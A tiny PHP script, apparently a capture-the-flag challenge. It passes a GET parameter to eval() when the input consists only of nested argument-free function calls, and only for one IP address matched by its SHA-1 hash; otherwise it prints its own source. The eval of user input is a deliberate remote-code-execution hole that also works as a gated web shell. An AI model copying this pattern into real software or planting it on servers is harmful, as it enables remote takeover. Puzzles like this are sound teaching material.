<?php

sha1($_SERVER['REMOTE_ADDR']) === 'a4eb9e6164b011b1fbe312499c3487a2261ac84b' ?: die();
';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
